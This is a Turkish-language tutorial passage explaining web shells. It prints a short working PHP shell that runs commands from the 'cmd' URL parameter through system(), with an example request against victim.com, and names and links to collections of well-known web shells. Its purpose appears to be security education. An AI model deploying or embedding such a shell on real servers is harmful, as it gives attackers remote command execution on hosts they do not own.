## Web Shell Nedir?

Bir **web shell**, ele geçirilmiş bir web sunucusu tarafından desteklenen bir dilde yazılmış ve komutları web sunucusunun kendisi aracılığıyla yürüten bir betiktir (script). Web shell, genellikle komutları yürüten ve dosyaları işleyen kodları içeren bir dosyadır. Ele geçirilmiş bir web uygulaması veya servisinin içine gizlenebilir; bu da tespit edilmesini zorlaştırır ve saldırganlar arasında oldukça popüler olmasını sağlar.

Web shell'ler; **PHP**, **ASP**, **JSP** ve hatta basit **CGI** betikleri gibi web sunucuları tarafından desteklenen çeşitli dillerde yazılabilir.

### Örnek PHP Web Shell

Sürecin nasıl işlediğini anlamak için örnek bir **PHP** web shell'e bakalım:

PHP

```
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Yukarıdaki shell, `shell.php` gibi PHP uzantılı bir dosyaya kaydedilebilir ve ardından saldırgan tarafından **Unrestricted File Upload**, **File Inclusion**, **Command Injection** gibi zafiyetler suistimal edilerek veya yetkisiz erişim sağlanarak web sunucusuna yüklenebilir.

Web shell sunucuya konuşlandırıldıktan (deployed) sonra, web shell'in barındırıldığı URL üzerinden erişilebilir; bu örnekte `http://victim.com/uploads/shell.php`. `shell.php` kodunda gözlemlediğimiz üzere, bir **GET method** ve saldırganın yürütmek istediği komutu içermesi gereken `cmd` değişkeninin değerini sağlamamız gerekir. Örneğin, `whoami` komutunu yürütmek istiyorsak, URL'ye yapılacak istek şu şekilde olmalıdır:

`http://victim.com/uploads/shell.php?cmd=whoami`

Yukarıdaki işlem `whoami` komutunu yürütecek ve sonucu web tarayıcısında görüntüleyecektir.

---

### Çevrimiçi Mevcut Web Shell'ler

Web sunucuları tarafından desteklenen dillerin gücü, çok sayıda fonksiyona sahip ve aynı zamanda tespitten kaçınabilen web shell'lerin ortaya çıkmasına neden olabilir. İnternette bulunabilen en popüler web shell'lerden bazılarını inceleyelim:

- **p0wny-shell:** Uzaktan komut yürütmeye (remote command execution) izin veren, minimalist, tek dosyadan oluşan bir PHP web shell'idir.
    
- **b374k shell:** Dosya yönetimi ve komut yürütme gibi diğer işlevlerin yanı sıra daha fazla özellik içeren bir PHP web shell'idir.
    
- **c99 shell:** Kapsamlı işlevselliğe sahip, iyi bilinen ve sağlam bir PHP web shell'idir.
    

Daha fazla web shell örneğine şu adresten ulaşabilirsiniz: [https://www.r57shell.net/index.php](https://www.r57shell.net/index.php)
